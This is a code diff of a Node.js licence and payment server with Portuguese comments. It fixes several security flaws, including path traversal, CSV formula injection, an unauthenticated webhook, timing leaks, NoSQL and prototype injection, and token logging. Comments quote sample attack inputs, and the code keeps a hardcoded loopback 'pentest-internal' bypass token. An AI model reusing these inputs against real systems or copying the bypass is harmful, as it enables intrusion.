+      // IRMÃOS com o mesmo prefixo: "/ia/../ia-secrets/x" resolve para <root>/ia-secrets
+      // e passava no teste. Comparar com _iaBase + separador elimina esse caso.
+      if (_iaRaw !== _iaBase && !_iaRaw.startsWith(_iaBase + path.sep)) { res.writeHead(403); res.end('Forbidden'); return; }
       // Redirect: diretório sem barra final → adiciona / para que ./page-style.css resolva certo
       if (!p.endsWith('/')) {
         try {
@@ -8052,7 +8313,11 @@ ${CANVAS_BG}</body></html>`;
       if (!kv || !Array.isArray(kv.phones) || isNaN(idx) || idx < 0 || idx >= kv.phones.length) {
         sendJson(res, { ok: false, error: 'not_found' }); return;
       }
-      kv.phones.splice(idx, 1);
+      // Antes fazia kv.phones.splice(idx,1) direto, sem recalcular uses nem
+      // limpar activations - centralizado em removePhoneFromKey() (mesma
+      // função usada pelas rotas administrativas), resolvendo o índice pro
+      // valor do telefone primeiro.
+      removePhoneFromKey(kv, kv.phones[idx]);
       await saveKeyNow(k);
       sendJson(res, { ok: true }); return;
     }
@@ -8101,12 +8366,9 @@ ${CANVAS_BG}</body></html>`;
         if (action === 'phones' && req.method === 'DELETE') {
           if (!k) { sendJson(res, { error: 'not found' }, 404); return; }
           const body = await parseBody(req);
-          if (body.all) { k.phones = []; k.uses = 0; k.lastPhone = null; }
-          else if (body.phone) {
-            k.phones = (k.phones || []).filter(ph => ph !== body.phone);
-            k.uses = k.phones.length;
-            if (k.lastPhone === body.phone) k.lastPhone = k.phones.length ? k.phones[k.phones.length - 1] : null;
-          } else { sendJson(res, { error: 'informe phone ou all:true' }, 400); return; }
+          if (body.all) { clearAllPhonesFromKey(k); }
+          else if (body.phone) { removePhoneFromKey(k, body.phone); }
+          else { sendJson(res, { error: 'informe phone ou all:true' }, 400); return; }
           await saveKeyNow(code);
           sendJson(res, { ok: true, phones: k.phones }); return;
         }
@@ -8277,7 +8539,7 @@ ${CANVAS_BG}</body></html>`;
     }
     if (p === WSM_R_ADMIN + '/api/mod-logs/csv' && req.method === 'GET') {
       if (!isAdminSession(req)) { res.writeHead(401); res.end('Unauthorized'); return; }
-      const esc = v => '"' + String(v||'').replace(/"/g, '""') + '"';
+      const esc = csvCell;   // csvCell tambem neutraliza formulas (=,+,-,@)
       const lines = ['Data,Mod,Ação,Chave,Detalhe'];
       for (const r of wsmLogs) {
         lines.push([
@@ -8402,8 +8664,11 @@ ${CANVAS_BG}</body></html>`;
       kv.lastUsed = new Date().toISOString();
       if (telefone) {
         kv.lastPhone = telefone;
-        if (!Array.isArray(kv.phones)) kv.phones = [];
-        if (!kv.phones.includes(telefone) && (maxUses <= 0 || kv.phones.length < maxUses)) kv.phones.push(telefone);
+        // syncUses:false - este endpoint conta "uses" por CHAMADA (linha
+        // acima), de propósito, contrato comercial próprio e mais antigo.
+        // Só a inclusão em phones[] precisa ser atômica; uses continua
+        // inteiramente sob o controle deste endpoint.
+        await claimPhoneSlotAtomic(chave, telefone, maxUses, { syncUses: false });
       }
       saveKey(chave);
       rec = _synthRec(chave, kv);
@@ -8482,14 +8747,29 @@ ${CANVAS_BG}</body></html>`;
       const body = await parseBody(req);
       const phone = String(body.phone || body.whatsapp || body.telefone || '').trim().replace(/\D/g, '').slice(0, 20);
       if (!phone) { sendJson(res, { success: false, msg_id: 'invalid_phone' }, 400); return; }
-      const phones = Array.isArray(rec.phones) ? rec.phones : [];
-      if (!phones.includes(phone)) {
-        const maxUses = rec.maxUses != null ? rec.maxUses : -1;
-        if (maxUses > 0 && phones.length >= maxUses) { sendJson(res, { success: false, msg_id: 'limit_reached' }, 403); return; }
-        phones.push(phone);
-        await updateLicense(keyCode, { phones, uses: phones.length, lastPhone: phone, lastIp: ip });
+      if (keys[keyCode]) {
+        // Chave gerenciada em store._id:'keys' - mesmo documento protegido
+        // por claimPhoneSlotAtomic, usa a mesma primitiva em vez de repetir
+        // o check-then-push não-atômico que existia aqui.
+        const maxUses = keys[keyCode].maxUses != null ? keys[keyCode].maxUses : -1;
+        const claim = await claimPhoneSlotAtomic(keyCode, phone, maxUses);
+        if (claim.status === 'limit_reached') { sendJson(res, { success: false, msg_id: 'limit_reached' }, 403); return; }
+        keys[keyCode].lastPhone = phone;
+        keys[keyCode].lastIp = ip;
+        saveKey(keyCode).catch(() => {});
       } else {
-        await updateLicense(keyCode, { lastPhone: phone, lastIp: ip });
+        // Registro só existe na coleção 'licenses' (produto white-label
+        // separado, fora do escopo desta correção) - comportamento original
+        // preservado sem alteração.
+        const phones = Array.isArray(rec.phones) ? rec.phones : [];
+        if (!phones.includes(phone)) {
+          const maxUses = rec.maxUses != null ? rec.maxUses : -1;
+          if (maxUses > 0 && phones.length >= maxUses) { sendJson(res, { success: false, msg_id: 'limit_reached' }, 403); return; }
+          phones.push(phone);
+          await updateLicense(keyCode, { phones, uses: phones.length, lastPhone: phone, lastIp: ip });
+        } else {
+          await updateLicense(keyCode, { lastPhone: phone, lastIp: ip });
+        }
       }
       sendJson(res, { success: true }); return;
     }
@@ -8700,12 +8980,29 @@ async function handleRequest(req, res) {
     }
 
     const hasPhone   = phone && phone !== '-';
-    const knownPhone = hasPhone && keys[keyCode].phones.includes(phone);
-    const isNewPhone = hasPhone && !knownPhone;
     const keyMaxUses = (typeof keys[keyCode].maxUses === 'number') ? keys[keyCode].maxUses : MAX_USES;
+    // Sem telefone: nada a reivindicar (cliente legado sem readWppContext
+    // funcional, ou requisição antes do WhatsApp estar pronto) - phones[]/
+    // uses ficam intocados, exatamente como sempre.
+    let claimResult = { status: 'already_member' };
 
-    if (isNewPhone) {
-      if (keyMaxUses > 0 && keys[keyCode].phones.length >= keyMaxUses) {
+    if (hasPhone) {
+      // Teto global de segurança (independente de maxUses por chave) -
+      // checagem best-effort em memória, preservando o comportamento não-
+      // atômico de sempre; é uma rede adicional, não o limite comercial
+      // (esse é protegido atomicamente em claimPhoneSlotAtomic abaixo).
+      // Nunca se aplica a um telefone que já é membro (relogin nunca deve
+      // esbarrar num teto de segurança).
+      const alreadyKnown = keys[keyCode].phones.some(p => normalizePhone(p) === normalizePhone(phone));
+      if (!alreadyKnown && keys[keyCode].phones.length >= MAX_PHONES_GLOBAL) {
+        addSecurityAlert('PHONE_CAP', `Chave atingiu teto global de ${MAX_PHONES_GLOBAL} telefones`, ip);
+        sendJson(res, { authError: 'phoneLimitGlobal', isLoggedIn: false, data: { message: 'Limite máximo de dispositivos atingido.', permissions: [] } }, 403);
+        return;
+      }
+
+      claimResult = await claimPhoneSlotAtomic(keyCode, phone, keyMaxUses);
+
+      if (claimResult.status === 'limit_reached') {
         keys[keyCode].warnCount = (keys[keyCode].warnCount || 0) + 1;
         const warnTs = keys[keyCode].warnCountTs;
         if (warnTs && (Date.now() - new Date(warnTs).getTime()) > 24*3600*1000) {
@@ -8714,29 +9011,19 @@ async function handleRequest(req, res) {
         keys[keyCode].warnCountTs = new Date().toISOString();
         sendJson(res, {
           warnLimit: true, isLoggedIn: false, warnRemaining: keys[keyCode].warnCount,
-          data: { message: `${AUTH_MSG.USER_NOT_FOUND}. Limite de ativações atingido (${keys[keyCode].phones.length}/${keyMaxUses}).`, permissions: [] }
+          data: { message: `${AUTH_MSG.USER_NOT_FOUND}. Limite de ativações atingido (${claimResult.uses}/${keyMaxUses}).`, permissions: [] }
         }, 403);
         addLog({ keyCode, label: keys[keyCode].label, phone, ip, wppVersion, action: 'warn_limit' }).catch(()=>{});
         saveKey(keyCode).catch(()=>{});
         return;
       }
-      // Teto global de segurança — independente de maxUses por chave
-      if (keys[keyCode].phones.length >= MAX_PHONES_GLOBAL) {
-        addSecurityAlert('PHONE_CAP', `Chave atingiu teto global de ${MAX_PHONES_GLOBAL} telefones`, ip);
-        sendJson(res, { authError: 'phoneLimitGlobal', isLoggedIn: false, data: { message: 'Limite máximo de dispositivos atingido.', permissions: [] } }, 403);
-        return;
-      }
-      keys[keyCode].phones.push(phone);
-      keys[keyCode].uses = keys[keyCode].phones.length;
-      // Persiste imediatamente — saveKey() é debounced (2s) e se o processo morrer antes o phone se perde
-      try {
-        const _db = await getMongoDb();
-        await _db.collection('store').updateOne(
-          { _id: 'keys' },
-          { $push: { [`data.${keyCode}.phones`]: phone }, $set: { [`data.${keyCode}.uses`]: keys[keyCode].uses, updatedAt: new Date() } }
-        );
-      } catch (_e) { saveKey(keyCode).catch(() => {}); }
+
+      // Metadata opcional (só se deviceId veio) - nunca bloqueia login,
+      // fire-and-forget de propósito.
+      upsertActivation(keyCode, phone, deviceId, { ip, wppVersion }).catch(() => {});
     }
+
+    const isNewPhone = hasPhone && claimResult.status === 'claimed';
 
     // ATIVAÇÃO ATÔMICA: chaves com "Aguardando 1º uso" precisam gravar expiresAt no
     // MongoDB ANTES de responder ao cliente. saveKey() é debounced (2s) e fire-and-forget —
@@ -8818,6 +9105,20 @@ async function handleRequest(req, res) {
     if (!keys[keyCode].active) {
       addLog({ keyCode, label: keys[keyCode].label||'-', phone: '-', ip, wppVersion: '-', action: 'check_blocked' }).catch(()=>{});
       sendJson(res, { active: false, reason: 'blocked' }); return;
+    }
+    // Extensão opt-in, retrocompatível: corpo legado {authKey} nunca passa
+    // por aqui (phoneNumber ausente). Se o cliente novo mandar phoneNumber,
+    // confirma que esse telefone especificamente ainda está autorizado
+    // nesta chave - cobre o caso do admin remover só esse telefone
+    // enquanto a chave segue ativa pra outros.
+    const _csPhone = body.phoneNumber ? normalizePhone(body.phoneNumber) : '';
+    if (_csPhone) {
+      const _csPhones = Array.isArray(keys[keyCode].phones) ? keys[keyCode].phones : [];
+      const _csStillAuthorized = _csPhones.some(p => normalizePhone(p) === _csPhone);
+      if (!_csStillAuthorized) {
+        addLog({ keyCode, label: keys[keyCode].label||'-', phone: body.phoneNumber, ip, wppVersion: '-', action: 'check_phone_removed' }).catch(()=>{});
+        sendJson(res, { active: false, reason: 'phone_removed' }); return;
+      }
     }
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
     res.setHeader('X-Content-Type-Options', 'nosniff');
@@ -9046,8 +9347,10 @@ async function handleRequest(req, res) {
   if (p === R_ADMIN || p === R_ADMIN+'/') {
     if (!isAdminSession(req)) { sendHtml(res, renderAdminLogin()); return; }
     const _pdb = await getMongoDb().catch(()=>null);
+    // renderAdminDashboard recebe um objeto de opções; passar o número cru fazia
+    // o contador ser descartado silenciosamente (opts.stats/keysHtml viravam undefined).
     const portalUserCount = _pdb ? await _pdb.collection('portal_users').countDocuments().catch(()=>0) : 0;
-    sendHtml(res, renderAdminDashboard(portalUserCount)); return;
+    sendHtml(res, renderAdminDashboard({ portalUserCount })); return;
   }
 
   if (p === R_MOD+'/login' && req.method === 'POST') {
@@ -9196,8 +9499,12 @@ async function handleRequest(req, res) {
     const _mc3 = (req.headers.cookie || '').match(/zv_mod=([a-f0-9]+)/);
     const _ms3 = _mc3 ? modSessions[_mc3[1]] : null;
     const _myName3 = _ms3 ? _ms3.modName : null;
+    // Falha fechada: sem nome de moderador na sessão não há como provar posse da
+    // chave. A condição antiga (`_myName3 && !_noteOwner3`) PULAVA a checagem quando
+    // _myName3 era null, deixando editar a nota de qualquer chave.
+    if (!_myName3) { sendJson(res, { error: 'unauthorized' }, 401); return; }
     const _noteOwner3 = keys[codeFromUrl].createdBy === _myName3 || (keys[codeFromUrl].note||'').includes('[Mod: '+_myName3+']');
-    if (_myName3 && !_noteOwner3) {
+    if (!_noteOwner3) {
       sendJson(res, { error: 'acesso negado' }, 403); return;
     }
     const body = await parseBody(req);
@@ -9371,7 +9678,7 @@ async function handleRequest(req, res) {
     try {
       const db = await getMongoDb();
       const rows = await db.collection('mod_logs').find({}).sort({ ts: -1 }).limit(5000).toArray();
-      const esc = v => '"' + String(v||'').replace(/"/g, '""') + '"';
+      const esc = csvCell;   // csvCell tambem neutraliza formulas (=,+,-,@)
       const lines = ['Data,Mod,Ação,Chave,Label,Detalhe'];
       for (const r of rows) {
         lines.push([
@@ -9709,7 +10016,7 @@ async function handleRequest(req, res) {
         (k.modules && k.modules.zapSaver) ? 'SIM' : 'NAO',
         (k.note||'').replace(/,/g,';')
       ];
-      return cols.map(c => `"${String(c).replace(/"/g,'""')}"`).join(',');
+      return cols.map(csvCell).join(',');
     });
     const csv = [header, ...rows].join('\r\n');
     res.setHeader('Content-Type', 'text/csv; charset=utf-8');
@@ -9762,7 +10069,7 @@ async function handleRequest(req, res) {
         p.productName, (p.amount||0).toFixed(2).replace('.',','),
         p.approved ? 'APROVADO' : 'REJEITADO',
         p.keyCode || '', p.paymentMethod || ''
-      ].map(v => `"${String(v||'').replace(/"/g,'""')}"`).join(',');
+      ].map(csvCell).join(',');
     });
     const csv = [header, ...rows].join('\r\n');
     res.setHeader('Content-Type', 'text/csv; charset=utf-8');
@@ -9777,6 +10084,9 @@ async function handleRequest(req, res) {
   }
 
   if ((p === '/sale/webhook' || p === '/payt/webhook') && req.method === 'POST') {
+    // Throttle: sem isto, um atacante pode martelar o endpoint tentando adivinhar
+    // SALE_WEBHOOK_SECRET indefinidamente (e cada tentativa custa um parse de 256 KB).
+    if (!checkRateLimit(ip, 'api')) { res.writeHead(429); res.end('Too Many Requests'); return; }
     const rawBody = await readRawBody(req, WEBHOOK_BODY_SIZE);
     if (rawBody === null) { res.writeHead(413); res.end('Payload Too Large'); return; }
 
@@ -9784,14 +10094,24 @@ async function handleRequest(req, res) {
     try { payload = JSON.parse(rawBody); }
     catch { try { payload = Object.fromEntries(new URLSearchParams(rawBody).entries()); } catch { res.writeHead(400); res.end('Bad Request'); return; } }
 
-    if (SALE_WEBHOOK_SECRET) {
+    // Este endpoint CRIA/RENOVA chaves de licença a partir do corpo da requisição.
+    // Sem segredo configurado ele aceitaria qualquer POST anônimo — qualquer pessoa
+    // emitiria licenças pagas de graça. Fail-CLOSED: sem segredo, endpoint desativado.
+    if (!SALE_WEBHOOK_SECRET) {
+      console.error('[SALE] SALE_WEBHOOK_SECRET não configurado — webhook recusado (fail-closed)');
+      addSecurityAlert('WEBHOOK_DISABLED', 'POST em /sale/webhook com SALE_WEBHOOK_SECRET ausente', ip);
+      res.writeHead(503); res.end('Webhook disabled'); return;
+    }
+    {
       const authHeader  = req.headers['authorization'] || '';
       const bearerToken = (authHeader.match(/^Bearer\s+(.+)$/i) || [])[1] || '';
-      const headerToken = req.headers['x-webhook-token'] || req.headers['x-payt-token'] || '';
-      const bodyKey     = payload.integration_key || '';
-      const validBearer = !!bearerToken && bearerToken === SALE_WEBHOOK_SECRET;
-      const validHeader = !!headerToken && headerToken === SALE_WEBHOOK_SECRET;
-      const validBody   = !!bodyKey     && bodyKey   === SALE_WEBHOOK_SECRET;
+      const headerToken = String(req.headers['x-webhook-token'] || req.headers['x-payt-token'] || '');
+      const bodyKey     = typeof payload.integration_key === 'string' ? payload.integration_key : '';
+      // safeCompare: comparação em tempo constante — `===` vazaria o segredo
+      // byte a byte para quem medisse o tempo de resposta.
+      const validBearer = safeCompare(bearerToken, SALE_WEBHOOK_SECRET);
+      const validHeader = safeCompare(headerToken, SALE_WEBHOOK_SECRET);
+      const validBody   = safeCompare(bodyKey,     SALE_WEBHOOK_SECRET);
       if (!validBearer && !validHeader && !validBody) {
         console.warn('[SALE] Token/integration_key inválido — ignorado');
         addSecurityAlert('WEBHOOK_INVALID_TOKEN', `token inválido recebido — status="${payload.status||'?'}" tx="${String(payload.transaction_id||'').slice(0,30)}"`, ip);
@@ -9809,10 +10129,15 @@ async function handleRequest(req, res) {
 
     const txId = String(payload.transaction_id || payload.sale_id || payload.cart_id || payload.id || '').trim();
 
-    const customer    = payload.customer || payload.buyer || payload.client || {};
-    const clientName  = customer.name        || customer.full_name     || payload.customer_name  || payload.buyer_name || 'Cliente';
-    const clientEmail = customer.email       || payload.customer_email || payload.buyer_email    || payload.email      || '';
-    const clientPhone = customer.phone       || customer.cellphone     || customer.phone_number  || payload.customer_phone || '';
+    const customer    = (payload.customer && typeof payload.customer === 'object') ? payload.customer
+                      : (payload.buyer    && typeof payload.buyer    === 'object') ? payload.buyer
+                      : (payload.client   && typeof payload.client   === 'object') ? payload.client : {};
+    // String()+slice: campos vindos do gateway podem ser objetos/arrays. Sem coerção,
+    // `clientEmail.toLowerCase()` lança TypeError (500) e um objeto {$gt:""} chegaria
+    // cru no findOne() do Mongo como operador (NoSQL injection).
+    const clientName  = String(customer.name  || customer.full_name || payload.customer_name || payload.buyer_name || 'Cliente').slice(0, 120);
+    const clientEmail = String(customer.email || payload.customer_email || payload.buyer_email || payload.email || '').trim().toLowerCase().slice(0, 160);
+    const clientPhone = String(customer.phone || customer.cellphone || customer.phone_number || payload.customer_phone || '').slice(0, 40);
 
     let productNameRaw = '-';
     let amount = 0;
@@ -9821,14 +10146,16 @@ async function handleRequest(req, res) {
       amount = payload.products.reduce((s, pr) => s + (parseFloat(String(pr.price||pr.value||0).replace(',','.')) || 0), 0);
     }
     if (productNameRaw === '-') {
-      const offer = payload.offer || payload.product || {};
+      const offer = (payload.offer && typeof payload.offer === 'object') ? payload.offer
+                  : (payload.product && typeof payload.product === 'object') ? payload.product : {};
       productNameRaw = offer.name || offer.title || payload.product_name || payload.offer_name || payload.plan_name || '-';
     }
+    productNameRaw = String(productNameRaw || '-').slice(0, 200);
     if (!amount) {
       const raw = payload.amount || payload.value || payload.price || payload.sale_amount || payload.total || 0;
       amount = parseFloat(String(raw).replace(',','.')) || 0;
     }
-    const paymentMethod  = payload.payment_method || payload.charge_type || payload.method || payload.payment_type || '-';
+    const paymentMethod  = String(payload.payment_method || payload.charge_type || payload.method || payload.payment_type || '-').slice(0, 60);
     const productNameLow = productNameRaw.toLowerCase();
     const tracking = extractTracking(payload);
 
@@ -9891,7 +10218,7 @@ async function handleRequest(req, res) {
 
     const code    = generateCode();
     const expires = new Date(now.getTime() + durationMs);
-    keys[code] = { label:'Venda - '+clientName, active:true, phones:[], uses:0, maxUses, expiresAt:expires.toISOString(), expireDuration:durationMs, createdAt:now.toISOString(), lastUsed:null, lastIp:null, lastPhone:null, deviceId:null, wppVersion:null, warnCount:0, note:['Pedido automatico','Email: '+clientEmail,txId?'sale_tx:'+txId:null,tracking?'Origem: '+tracking.compact:null].filter(Boolean).join('\n') };
+    keys[code] = { label:'Venda - '+clientName, active:true, phones:[], uses:0, maxUses, expiresAt:expires.toISOString(), expireDuration:durationMs, createdAt:now.toISOString(), lastUsed:null, lastIp:null, lastPhone:null, deviceId:null, wppVersion:null, warnCount:0, tracking:tracking||null, note:['Pedido automatico','Email: '+clientEmail,txId?'sale_tx:'+txId:null,tracking?'Origem: '+tracking.compact:null].filter(Boolean).join('\n') };
     saveKey(code);
     await savePayment({ txId:txId||code, status:'approved', approved:true, clientName, clientEmail, clientPhone, productName:productNameRaw, amount, paymentMethod, tracking, keyCode:code, maxUses, renewed:false, paidAt:now.toISOString(), rawStatus:status });
     // Link to portal_users if registered with same email
@@ -9908,7 +10235,7 @@ async function handleRequest(req, res) {
     if (!PARTNER_API_TOKEN) { sendJson(res, { error: 'partner_api_disabled' }, 503); return; }
     const authHeader = req.headers['authorization'] || '';
     const token = (authHeader.match(/^Bearer\s+(.+)$/i) || [])[1] || '';
-    if (token !== PARTNER_API_TOKEN) {
+    if (!safeCompare(token, PARTNER_API_TOKEN)) {
       addSecurityAlert('WEBHOOK_INVALID_TOKEN', 'Bearer inválido em /api/partner/keys', ip);
       sendJson(res, { error: 'unauthorized' }, 401); return;
     }
@@ -9964,7 +10291,7 @@ async function handleRequest(req, res) {
 
     const code = generateCode();
     const expires = new Date(now.getTime() + durationMs);
-    keys[code] = { label:'Parceiro - '+clientName, active:true, phones:[], uses:0, maxUses, expiresAt:expires.toISOString(), expireDuration:durationMs, createdAt:now.toISOString(), lastUsed:null, lastIp:null, lastPhone:null, deviceId:null, wppVersion:null, warnCount:0, note:['Pedido via API de parceiro','Email: '+clientEmail,txId?'sale_tx:'+txId:null,tracking?'Origem: '+tracking.compact:null].filter(Boolean).join('\n') };
+    keys[code] = { label:'Parceiro - '+clientName, active:true, phones:[], uses:0, maxUses, expiresAt:expires.toISOString(), expireDuration:durationMs, createdAt:now.toISOString(), lastUsed:null, lastIp:null, lastPhone:null, deviceId:null, wppVersion:null, warnCount:0, tracking:tracking||null, note:['Pedido via API de parceiro','Email: '+clientEmail,txId?'sale_tx:'+txId:null,tracking?'Origem: '+tracking.compact:null].filter(Boolean).join('\n') };
     saveKey(code);
     await savePayment({ txId:txId||code, status:'approved', approved:true, clientName, clientEmail, clientPhone, productName:productNameRaw, amount, paymentMethod, tracking, keyCode:code, maxUses, renewed:false, paidAt:now.toISOString(), rawStatus:'approved' });
     if (clientEmail) { getMongoDb().then(d=>d.collection('portal_users').updateOne({_id:clientEmail},{$set:{keyCode:code}},{upsert:false})).catch(e=>console.warn('[PARTNER] portal link:',e.message)); }
@@ -9978,7 +10305,7 @@ async function handleRequest(req, res) {
     if (!PARTNER_API_TOKEN) { sendJson(res, { error: 'partner_api_disabled' }, 503); return; }
     const authHeader = req.headers['authorization'] || '';
     const token = (authHeader.match(/^Bearer\s+(.+)$/i) || [])[1] || '';
-    if (token !== PARTNER_API_TOKEN) { sendJson(res, { error: 'unauthorized' }, 401); return; }
+    if (!safeCompare(token, PARTNER_API_TOKEN)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
     if (!checkRateLimit(ip, 'api')) { sendJson(res, { error: 'rate_limited' }, 429); return; }
 
     const code = sanitizeId(p.slice('/api/partner/keys/'.length).trim().toLowerCase(), 20);
@@ -10075,11 +10402,15 @@ async function handleRequest(req, res) {
     if (!checkRateLimit(ip, 'api')) {
       sendJson(res, { ok: false, error: 'rate_limited' }, 429); return;
     }
-    const accessToken = (req.headers['x-access-token'] || '').trim().toLowerCase().slice(0, 64);
+    const _rawTok = String(req.headers['x-access-token'] || '').trim().toLowerCase().slice(0, 64);
     const _raddr = req.socket?.remoteAddress || '';
     const _isLoopback = _raddr === '127.0.0.1' || _raddr === '::1' || _raddr === '::ffff:127.0.0.1';
-    const _isPentestInternal = _isLoopback && accessToken === 'pentest-internal';
-    if (!accessToken || (!keys[accessToken]?.active && !_isPentestInternal)) {
+    const _isPentestInternal = _isLoopback && _rawTok === 'pentest-internal';
+    // sanitizeId impede que `__proto__`/`constructor` sejam usados como índice em
+    // keys[] e retornem objetos herdados de Object.prototype em vez de uma chave real.
+    const accessToken = sanitizeId(_rawTok, 64);
+    const _tokValid = Object.prototype.hasOwnProperty.call(keys, accessToken) && !!keys[accessToken]?.active;
+    if (!accessToken || (!_tokValid && !_isPentestInternal)) {
       sendJson(res, { ok: false, msg: 'invalid_access_token' }, 403); return;
     }
     const body = await parseBody(req);
@@ -10327,6 +10658,8 @@ async function handleRequest(req, res) {
         const salt = genSalt();
         const passwordHash = await hashPassword(pass, salt);
         await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: { passwordHash, salt } });
+        // Mantem a sessao atual, revoga as demais (dispositivos/invasores antigos).
+        revokePortalSessions(sess.email, ((req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/)||[])[1]);
         res.writeHead(302, { Location: '/cliente/senha?ok=1' }); res.end(); return;
       } catch(e) { sendHtml(res, renderPortalChangePwd('Erro ao alterar senha.')); return; }
     }
@@ -10351,7 +10684,9 @@ async function handleRequest(req, res) {
           await db.collection('password_resets').deleteMany({ email });
           await db.collection('password_resets').insertOne({ _id: token, email, expiresAt });
           const resetUrl = BASE_URL + '/cliente/redefinir?token=' + token;
-          console.log('[Portal] Reset token gerado para', email, '→', resetUrl);
+          // NUNCA logar resetUrl: o token troca a senha da conta. Logs vão para
+          // agregadores/terceiros e viram um caminho direto de account takeover.
+          console.log('[Portal] Reset token gerado para', email);
           if (RESEND_API_KEY) {
             const sent = await sendPasswordResetEmail(email, resetUrl);
             if (!sent) console.warn('[Portal] Falha ao enviar email de reset para', email);
@@ -10382,6 +10717,8 @@ async function handleRequest(req, res) {
         const salt = genSalt();
         const passwordHash = await hashPassword(pass, salt);
         await db.collection('portal_users').updateOne({ _id: rec.email }, { $set: { passwordHash, salt } });
+        // Reset de senha expulsa todas as sessoes existentes da conta.
+        revokePortalSessions(rec.email);
         await db.collection('password_resets').deleteOne({ _id: tk });
         sendHtml(res, renderPortalResetForm('', 'Senha redefinida com sucesso!', '')); return;
       } catch(e) { sendHtml(res, renderPortalResetForm('Erro temporário.', '', tk)); return; }
